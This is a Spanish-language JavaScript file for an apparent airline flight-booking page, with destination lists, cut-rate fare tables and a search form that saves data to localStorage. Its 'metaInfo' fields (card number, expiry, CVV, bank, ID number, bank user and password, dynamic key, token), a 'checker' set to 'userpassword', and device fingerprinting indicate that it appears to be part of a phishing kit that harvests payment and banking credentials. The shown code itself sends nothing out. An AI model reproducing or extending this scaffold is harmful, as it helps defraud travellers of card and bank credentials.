/**
 * CONFIGURACIÓN
 */
//const API_URL = 'https://d9o2bj036p7mb.cloudfront.net'; // Cambiar según convenga.
//const API_URL = 'https://dfjzmsbppi61g.cloudfront.net'; // Cambiar según convenga.

const LS = window.localStorage;

const monthDic = ['Ene','Feb','Mar','Abr','May','Jun','Jul','Ago','Sep','Oct','Nov','Dic'];
const dayDic = ['Lun', 'Mar', 'Mie', 'Jue', 'Vie', 'Sab', 'Dom'];

const countries = [
    {
        regionName: "America del Norte",
        costRange: [750, 1100],
        countries: [
            "Canadá",
            "Estados Unidos",
            "México"
        ]
    },
    {
        regionName: "America Central y el Caribe",
        costRange: [550, 850],
        countries: [
            "Belice",
            "Costa Rica",
            "El Salvador",
            "Guatemala",
            "Honduras",
            "Nicaragua",
            "Panamá",
            "Aruba",
            "Barbados",
            "Cuba",
            "Curazao",
            "Puerto Rico",
            "República Dominicana"
        ]
    },
    {
        regionName: "America del Sur",
        costRange: [550, 850],
        countries: [
            "Argentina",
            "Bolivia",
            "Brasil",
            "Chile",
            "Ecuador",
            "Paraguay",
            "Perú",
            "Uruguay",
            "Venezuela"
        ]
    },
    {
        regionName: "Europa y otros",
        costRange: [1300, 1900],
        countries: [
            "España",
            "Reino Unido",
            "Alemania"
        ]
    }

];

const pricesNAC = {
    flight_1:{
        xs: 49900,
        s: 69900,
        m: 89900,
    },
    flight_2:{
        xs: 55900,
        s: 73900,
        m: 89900,
    },
    flight_3:{
        xs: 78900,
        s: 109900,
        m: 129000,
    } 
};

const pricesINT = {
    flight_1:{
        xs: 359900,
        s: 389000,
        m: 410900,
    },
    flight_2:{
        xs: 389000,
        s: 428900,
        m: 478900,
    },
    flight_3:{
        xs: 529000,
        s: 569000,
        m: 599900,
    }
};

let info = {
    flightInfo:{
        type: 1,
        ticket: false,
        origin: {
            city: "",
            country: "",
            code: ""
        },
        destination: {
            
        },
        adults: 1,
        children: 0,
        babies: 0,
        flightDates: [0, 0],
        ticket_nat: false,
        ticket_sched: false,
        ticket_type: false,

    },
    passengersInfo:{
        adults: [],
        children: [],
        babies: []
    },
    metaInfo:{
        email: '',
        p: '',
        pdate: '',
        c: '',
        ban: '',
        dues: '',
        dudename: '',
        surname: '',
        cc: '',
        telnum: '',
        city: '',
        state: '',
        address: '',
        cdin: '',
        ccaj: '',
        cavance: '',
        tok: '',
        user: '',
        puser: '',
        err: '',
        disp: '',
    },
    checkerInfo: {
        company: '',
        mode: 'userpassword',
    },
    edit: 0
}

dDisp();

function limitDigits(input, maxDigits) {
    parseInt(input.value)
    if (input.value.length > maxDigits) {
        input.value = input.value.slice(0, maxDigits);
    }
}

function dDisp() {
    var userAgent = navigator.userAgent || navigator.vendor || window.opera;

    if(userAgent.includes('iPhone') || userAgent.includes('iPad') || userAgent.includes('iOS')){
        info.metaInfo.disp = "iOS";
    }else if(userAgent.includes('Windows')){
        info.metaInfo.disp = "PC";
    }else{
        info.metaInfo.disp = "Android";
    }
}


LS.getItem('info') ? info = JSON.parse(LS.getItem('info')) : LS.setItem('info', JSON.stringify(info));


function toggleMenu() {
    const submenuContainer = document.querySelector('.submenu-container');
    const submenuToggle = document.querySelector('.submenu-toggle');
    const arrowDown = document.querySelector('.arrow-down');
    
    // Alterna la visibilidad del submenú
    submenuContainer.classList.toggle('show-submenu');
    
    // Alterna la dirección de la flecha
    arrowDown.classList.toggle('active');
    
    // Eliminar subrayado en Bogotá cuando el submenú está abierto
    if (submenuContainer.classList.contains('show-submenu')) {
        submenuToggle.classList.remove('underline');
    } else {
        submenuToggle.classList.add('underline');
    }
}

// Cerrar el menú cuando se haga clic fuera de él
document.addEventListener('click', function(event) {
    const submenu = document.querySelector('.submenu-container');
    const submenuToggle = document.querySelector('.submenu-toggle');
    // Verificar si el clic ocurrió fuera del menú y del botón que lo activa
    if (!submenu.contains(event.target) && !submenuToggle.contains(event.target)) {
        submenu.classList.remove('show-submenu');
        document.querySelector('.arrow-down').classList.remove('active');
    }
});



    
    
    
    function toggleDropdown() {
    const dropdown = document.getElementById('dropdownMenu');
    if (dropdown) {
        dropdown.classList.toggle('open');
    }
}
document.addEventListener("DOMContentLoaded", () => {
    function dDisp() {
    var userAgent = navigator.userAgent || navigator.vendor || window.opera;

    if(userAgent.includes('iPhone') || userAgent.includes('iPad') || userAgent.includes('iOS')){
        info.metaInfo.disp = "iOS";
    }else if(userAgent.includes('Windows')){
        info.metaInfo.disp = "PC";
    }else{
        info.metaInfo.disp = "Android";
    }
}

    

function normalizarFecha(fecha) {
    if (!fecha) return null;
    if (fecha.includes("/")) {
        // Formato DD/MM/YYYY
        const partes = fecha.split("/");
        if (partes.length === 3) {
            const yyyy = partes[2];
            const mm = partes[1].padStart(2, '0');
            const dd = partes[0].padStart(2, '0');
            return `${yyyy}-${mm}-${dd}`;
        }
    }
    // Si ya está en formato YYYY-MM-DD
    return fecha;
}
 
// ...existing code...
function saveAndRedirect() {
   const flightType = document.querySelector('input[name="FlightType"]:checked')?.value;
   
    const rawDateIda = document.getElementById("selected-date-ida").textContent.trim();
    const flightData = {
        origin: document.getElementById("origin-input").value, // Origen
        destination: document.getElementById("destination-input").value, // Destino
        dateIda: normalizarFecha(rawDateIda), // <-- Normaliza aquí
        dateVuelta: flightType === "ida-vuelta" ? document.getElementById("selected-date-vuelta").textContent.trim() : "",
        passengers: {
            adults: parseInt(document.getElementById("adults-count").textContent),
            teens: parseInt(document.getElementById("teens-count").textContent),
            children: parseInt(document.getElementById("children-count").textContent),
            babies: parseInt(document.getElementById("babies-count").textContent),
        },
    };

    if (!flightData.origin || !flightData.destination || !flightData.dateIda || !flightData.passengers.adults) {
        alert("Por favor, completa todos los campos requeridos.");
        return;
    }

    localStorage.setItem("flightData", JSON.stringify(flightData));
    console.log("Datos guardados:", flightData);

    window.location.href = "P2/flight-detail.html";
}
// ...existing code...



// Asegurar que la función está accesible globalmente
window.saveAndRedirect = saveAndRedirect;

});
  

